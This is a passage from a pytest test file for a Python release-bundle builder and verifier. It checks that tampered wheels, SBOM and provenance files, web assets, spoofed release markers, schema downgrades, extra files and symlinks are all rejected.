        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    manifest_path = bundle / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    cortex = next(item for item in manifest["artifacts"] if item["role"] == "cortex-wheel")
    wheel = bundle / cortex["path"]
    _rewrite_wheel(
        wheel,
        remove=missing_module,
        script=changed_script,
        duplicate_script=duplicate_script,
        unsafe_member=unsafe_member,
    )
    cortex["size"] = wheel.stat().st_size
    cortex["sha256"] = hashlib.sha256(wheel.read_bytes()).hexdigest()
    manifest["private_access"]["wheel_sha256"] = cortex["sha256"]
    manifest_path.write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n")
    sbom_path = bundle / "sbom.cdx.json"
    sbom = json.loads(sbom_path.read_text())
    sbom_cortex = next(component for component in sbom["components"] if component["name"] == "cortex")
    sbom_cortex["hashes"][0]["content"] = cortex["sha256"]
    sbom_path.write_text(json.dumps(sbom, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="private-access wheel"):
        verify_bundle(bundle, node_executable=analyser_node)


@pytest.mark.parametrize("entry_attack", ["default-inheritance", "attacker-dist-info"])
def test_composed_bundle_binds_direct_cortex_entry_points(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    entry_attack: str,
) -> None:
    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / f"bundle-{entry_attack}").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    manifest_path = bundle / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    cortex = next(item for item in manifest["artifacts"] if item["role"] == "cortex-wheel")
    wheel = bundle / cortex["path"]
    _rewrite_wheel(wheel, entry_attack=entry_attack)
    cortex["size"] = wheel.stat().st_size
    cortex["sha256"] = hashlib.sha256(wheel.read_bytes()).hexdigest()
    manifest["private_access"]["wheel_sha256"] = cortex["sha256"]
    manifest_path.write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n")
    sbom_path = bundle / "sbom.cdx.json"
    sbom = json.loads(sbom_path.read_text())
    sbom_cortex = next(component for component in sbom["components"] if component["name"] == "cortex")
    sbom_cortex["hashes"][0]["content"] = cortex["sha256"]
    sbom_path.write_text(json.dumps(sbom, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="private-access wheel"):
        verify_bundle(bundle, node_executable=analyser_node)


@pytest.mark.parametrize("case", ["font", "notice", "license"])
def test_composed_bundle_rejects_unapproved_font_or_ofl_payload(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    case: str,
) -> None:
    web_root, web_ledger = web_closure
    if case == "font":
        css = web_root / "client/assets/app.css"
        text = css.read_text()
        marker = "data:font/woff2;base64,"
        offset = text.index(marker) + len(marker)
        replacement = "A" if text[offset] != "A" else "B"
        css.write_text(text[:offset] + replacement + text[offset + 1 :])
    elif case == "notice":
        (web_root / "THIRD_PARTY_NOTICES.md").write_text("incomplete notice\n")
    else:
        (web_root / "licenses/OFL-1.1.txt").write_text("not a license\n")
    _rewrite_web_ledger(web_root, web_ledger)

    with pytest.raises(BundleVerificationError, match="unsafe Web closure"):
        BundleBuilder(tmp_path / f"bundle-{case}").assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-23T12:00:00Z",
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
        node_executable=analyser_node,
        )


def test_schema2_sbom_and_provenance_cover_composed_inputs(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    verified = verify_bundle(bundle, node_executable=analyser_node)
    components = {component["name"]: component for component in verified.sbom["components"]}
    assert {"cortex", "cortex-research"} <= components.keys()
    assert components["cortex-web-release"]["version"] == "cortex-r0-build-1"
    assert components["cortex-web-release"]["hashes"] == [
        {
            "alg": "SHA-256",
            "content": hashlib.sha256(web_ledger.read_bytes()).hexdigest(),
        }
    ]
    assert components["cortex-web-node-adapter"]["version"] == "1"
    assert components["Geist Latin"]["licenses"] == [{"license": {"id": "OFL-1.1"}}]
    assert components["Geist Mono Latin"]["licenses"] == [
        {"license": {"id": "OFL-1.1"}}
    ]
    assert components["SIL Open Font License 1.1 terms"]["hashes"] == [
        {
            "alg": "SHA-256",
            "content": hashlib.sha256(
                (web_root / "licenses/OFL-1.1.txt").read_bytes()
            ).hexdigest(),
        }
    ]
    assert verified.provenance["schema_version"] == 2
    assert verified.provenance["claim"] == "inputs-only"
    assert verified.provenance["signed"] is False
    assert verified.provenance["reproducible_build_proven"] is False
    assert verified.provenance["web_build_inputs"] == {
        "release_build_id": "cortex-r0-build-1",
        "package_lock_sha256": WEB_LOCK_SHA256,
        "payload_ledger_sha256": hashlib.sha256(web_ledger.read_bytes()).hexdigest(),
        "node_adapter": {
            "path": "server/node-adapter.mjs",
            "version": 1,
            "sha256": hashlib.sha256(
                (web_root / "server/node-adapter.mjs").read_bytes()
            ).hexdigest(),
        },
        "font_components": [
            "5f3d6ad60f29d6cb708414ec6887163d63bf197377ef5417d2483ff31ace6c3b",
            "9b6f5ff45b278c744b5f379a2c4ecbaf858a842b8eaf82ac8d21b699ca16c608",
        ],
        "ofl_terms": {
            "path": "licenses/OFL-1.1.txt",
            "sha256": hashlib.sha256(
                (web_root / "licenses/OFL-1.1.txt").read_bytes()
            ).hexdigest(),
        },
    }


@pytest.mark.parametrize("target", ["sbom", "provenance"])
def test_schema2_verifier_rejects_rewritten_supply_chain_claims(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    target: str,
) -> None:
    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / f"bundle-{target}").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    if target == "sbom":
        path = bundle / "sbom.cdx.json"
        value = json.loads(path.read_text())
        value["components"] = [
            component for component in value["components"] if component["name"] != "Geist Latin"
        ]
    else:
        path = bundle / "provenance-inputs.json"
        value = json.loads(path.read_text())
        del value["web_build_inputs"]
    path.write_text(json.dumps(value, sort_keys=True, separators=(",", ":")) + "\n")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="supply-chain metadata"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_schema2_web_tamper_fails_after_only_outer_checksum_rewrite(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    client = bundle / "artifacts/web/client/assets/app.js"
    client.write_bytes(client.read_bytes() + b"// tampered\n")
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="Web payload checksum"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_schema2_rewritten_safe_payload_changes_digest_but_semantic_tamper_fails(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    original_digest = verify_bundle(bundle, node_executable=analyser_node).digest
    client = bundle / "artifacts/web/client/assets/app.js"
    client.write_bytes(client.read_bytes() + b"// safe payload revision\n")
    _rewrite_schema2_web_bindings(bundle)
    assert verify_bundle(bundle, node_executable=analyser_node).digest != original_digest

    server = bundle / "artifacts/web/server/index.js"
    server.write_bytes(server.read_bytes() + b'// /Users/attacker/checkout\n')
    _rewrite_schema2_web_bindings(bundle)
    with pytest.raises(BundleVerificationError, match="unsafe Web closure absolute path"):
        verify_bundle(bundle, node_executable=analyser_node)


@pytest.mark.parametrize(
    ("case", "relative", "replacement"),
    [
        (
            "commented-build-id",
            "server/index.js",
            '// "cortex-r0-build-1"\nexport default "inactive";\n',
        ),
        (
            "conflicting-build-id",
            "server/index.js",
            'export default "cortex-r0-build-1";\nconst old = "cortex-r0-build-0";\n',
        ),
        (
            "commented-adapter",
            "server/node-adapter.mjs",
            'import handler from "./index.js";\n// const ADAPTER_VERSION = 1;\nexport { handler };\n',
        ),
        (
            "string-adapter",
            "server/node-adapter.mjs",
            'import handler from "./index.js";\nconst marker = "ADAPTER_VERSION = 1";\nexport { handler };\n',
        ),
        (
            "dead-adapter",
            "server/node-adapter.mjs",
            'import handler from "./index.js";\nif (false) { const ADAPTER_VERSION = 1; }\nexport { handler };\n',
        ),
        (
            "conflicting-adapter",
            "server/node-adapter.mjs",
            'import handler from "./index.js";\nconst ADAPTER_VERSION = 1;\nconst ADAPTER_VERSION = 2;\nexport { handler };\n',
        ),
        (
            "adapter-expression",
            "server/node-adapter.mjs",
            'import handler from "./index.js";\nconst ADAPTER_VERSION = 1 + 1;\nexport { handler };\n',
        ),
        (
            "adapter-string-literal",
            "server/node-adapter.mjs",
            'import handler from "./index.js";\nconst ADAPTER_VERSION = "1";\nexport { handler };\n',
        ),
        (
            "for-initializer-adapter",
            "server/node-adapter.mjs",
            'import handler from "./index.js";\nfor (const ADAPTER_VERSION = 1; false; ) {}\nexport { handler };\n',
        ),
    ],
)
def test_schema2_rewritten_ledger_rejects_spoofed_release_markers(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    case: str,
    relative: str,
    replacement: str,
) -> None:
    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / f"bundle-{case}").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    target = bundle / "artifacts/web" / relative
    target.write_text(replacement)
    _rewrite_schema2_web_bindings(bundle)

    with pytest.raises(BundleVerificationError, match="unsafe Web closure"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_composed_payload_cannot_be_downgraded_to_schema1(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    manifest_path = bundle / "manifest.json"
    manifest = json.loads(manifest_path.read_text())
    manifest["schema_version"] = 1
    manifest["dependency_closure"] = "partial"
    del manifest["web_payload"]
    del manifest["private_access"]
    manifest_path.write_text(json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n")
    sbom_path = bundle / "sbom.cdx.json"
    sbom = json.loads(sbom_path.read_text())
    sbom["version"] = 1
    sbom["components"] = [
        component
        for component in sbom["components"]
        if component["name"] in {"cortex", "cortex-research"}
    ]
    sbom["properties"][0]["value"] = "partial"
    sbom_path.write_text(json.dumps(sbom, sort_keys=True, separators=(",", ":")) + "\n")
    provenance_path = bundle / "provenance-inputs.json"
    provenance = json.loads(provenance_path.read_text())
    provenance["schema_version"] = 1
    del provenance["web_build_inputs"]
    provenance_path.write_text(
        json.dumps(provenance, sort_keys=True, separators=(",", ":")) + "\n"
    )
    _rewrite_outer_checksums(bundle)

    with pytest.raises(BundleVerificationError, match="schema-1 bundle must be wheel-only"):
        verify_bundle(bundle, node_executable=analyser_node)


def test_bundle_rejects_tampering_extra_files_and_symlinks(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
) -> None:
    bundle = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-1",
        release_sequence=1,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
    ).path

    manifest = bundle / "manifest.json"
    manifest.write_bytes(manifest.read_bytes() + b" ")
    with pytest.raises(BundleVerificationError, match="checksum"):
        verify_bundle(bundle)

    bundle = BundleBuilder(tmp_path / "bundle-extra").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
    ).path
    (bundle / "undeclared.txt").write_text("surprise")
    with pytest.raises(BundleVerificationError, match="undeclared"):
        verify_bundle(bundle)

    bundle = BundleBuilder(tmp_path / "bundle-link").assemble(
        release_id="cortex-dev-3",
        release_sequence=3,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
    ).path
    (bundle / "link").symlink_to(bundle / "manifest.json")
    with pytest.raises(BundleVerificationError, match="symlink"):
        verify_bundle(bundle)


def test_manifest_schema_is_closed(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
) -> None:
    bundle = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-1",
        release_sequence=1,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-23T12:00:00Z",
    ).path
    raw = json.loads((bundle / "manifest.json").read_text())
    raw["unexpected"] = True
    (bundle / "manifest.json").write_text(json.dumps(raw))
    checksums = bundle / "checksums.sha256"
    lines = [line for line in checksums.read_text().splitlines() if not line.endswith("  manifest.json")]
    import hashlib

    lines.append(f"{hashlib.sha256((bundle / 'manifest.json').read_bytes()).hexdigest()}  manifest.json")
    checksums.write_text("\n".join(sorted(lines)) + "\n")
    with pytest.raises(BundleVerificationError, match="schema"):
        verify_bundle(bundle)


def test_repository_build_rejects_a_dirty_checkout(tmp_path: Path) -> None:
    from distribution.bundle import build_repository_bundle

    repository = tmp_path / "repository"
    repository.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repository, check=True)
    (repository / "uv.lock").write_text("version = 1\n")
    (repository / "tracked.txt").write_text("clean\n")
    subprocess.run(["git", "add", "."], cwd=repository, check=True)
    subprocess.run(
        ["git", "-c", "user.name=Test", "-c", "user.email=test@example.invalid", "commit", "-qm", "base"],
        cwd=repository,
        check=True,
    )
    (repository / "tracked.txt").write_text("dirty\n")

    with pytest.raises(BundleVerificationError, match="clean"):
        build_repository_bundle(
            repository,
            tmp_path / "bundle",
            release_id="cortex-dev-1",
            release_sequence=1,
        )


def test_repository_build_bridges_verified_web_inputs_into_schema3(
    tmp_path: Path,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    embedded_python_runtime: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """The production entry point can only emit the embedded tier."""

    import distribution.bundle as bundle_module
    from distribution.cli import main
    from test_bundle_schema3 import _dependency_wheels, _requirements, _workspace_wheels

    repository = tmp_path / "repository"
    repository.mkdir()
    (repository / ".git").mkdir()
    (repository / "uv.lock").write_text("version = 1\n")
    inputs = tmp_path / "inputs"
    inputs.mkdir()
    workspace = _workspace_wheels(inputs)
    dependencies = _dependency_wheels(inputs)
    wheelhouse = tmp_path / "wheelhouse"
    wheelhouse.mkdir()
    for wheel in dependencies:
        shutil.copy2(wheel, wheelhouse / wheel.name)
    requirements = tmp_path / "closure.requirements.txt"
    requirements.write_text(_requirements(dependencies))
    pin = (
        Path(__file__).resolve().parents[2]
        / "vendor/python-runtime/cpython-3.14.6-cp314-macosx_11_0_arm64.pin.json"
    )
    observed: list[tuple[str, ...]] = []
    real_run = subprocess.run

    def run(command: list[str], **kwargs: object) -> subprocess.CompletedProcess[str]:
        if command[0] == str(analyser_node):
            # Only the build commands are stubbed. The Web closure analyser is
            # part of verification and must really parse the payload.
            return real_run(command, **kwargs)
        observed.append(tuple(command))
        if command[:2] == ["git", "status"]:
            return subprocess.CompletedProcess(command, 0, stdout="", stderr="")
        if command[:2] == ["git", "rev-parse"]:
            return subprocess.CompletedProcess(command, 0, stdout="a" * 40 + "\n", stderr="")
        assert command[:3] == ["uv", "build", "--offline"]
        package = command[command.index("--package") + 1]
        destination = Path(command[command.index("--out-dir") + 1])
        wheel = next(
            path for path in workspace if path.name.startswith(package.replace("-", "_") + "-")
        )
        shutil.copy2(wheel, destination / wheel.name)
        return subprocess.CompletedProcess(command, 0, stdout="", stderr="")

    monkeypatch.setattr(bundle_module.subprocess, "run", run)
    web_root, web_ledger = web_closure

    output = tmp_path / "bundle"
    assert main(
        [
            "build",
            "--repository",
            str(repository),
            "--output",
            str(output),
            "--release-id",
            "cortex-dev-1",
            "--release-sequence",
            "1",
            "--web-payload-root",
            str(web_root),
            "--web-payload-ledger",
            str(web_ledger),
            "--web-build-id",
            "cortex-r0-build-1",
            "--web-lock-sha256",
            WEB_LOCK_SHA256,
            "--node-adapter-version",
            "1",
            "--node-executable",
            str(analyser_node),
            "--python-runtime",
            str(embedded_python_runtime),
            "--python-runtime-pin",
            str(pin),
            "--requirements",
            str(requirements),
            "--wheelhouse",
            str(wheelhouse),
        ]
    ) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["result"]["path"] == str(output)

    verified = verify_bundle(output, node_executable=analyser_node)
    assert verified.manifest["schema_version"] == 3
    assert verified.manifest["python"]["embedded"] is True
    assert verified.manifest["dependency_closure"] == "complete"
    assert verified.manifest["web_payload"]["release_build_id"] == "cortex-r0-build-1"
    # One `uv build` per workspace root, derived rather than counted out: the
    # driver builds exactly the names the closure proof is rooted at.
    assert [command[:2] for command in observed] == [
        ("git", "status"),
        ("git", "rev-parse"),
        *(("uv", "build") for _ in _WORKSPACE_DISTRIBUTIONS),
    ]


def test_repository_build_refuses_to_emit_a_host_coupled_bundle(
    tmp_path: Path,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Without the vendored runtime there is no schema-2 fallback, only a refusal."""

    import distribution.bundle as bundle_module
    from distribution.bundle import build_repository_bundle

    repository = tmp_path / "repository"
    repository.mkdir()
    (repository / ".git").mkdir()
    (repository / "uv.lock").write_text("version = 1\n")
    web_root, web_ledger = web_closure

    def run(command: list[str], **_kwargs: object) -> subprocess.CompletedProcess[str]:
        stdout = "a" * 40 + "\n" if command[:2] == ["git", "rev-parse"] else ""
        return subprocess.CompletedProcess(command, 0, stdout=stdout, stderr="")

    monkeypatch.setattr(bundle_module.subprocess, "run", run)

    with pytest.raises(BundleVerificationError, match="vendor_python_runtime"):
        build_repository_bundle(
            repository,
            tmp_path / "bundle",
            release_id="cortex-dev-1",
            release_sequence=1,
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
            node_executable=analyser_node,
        )


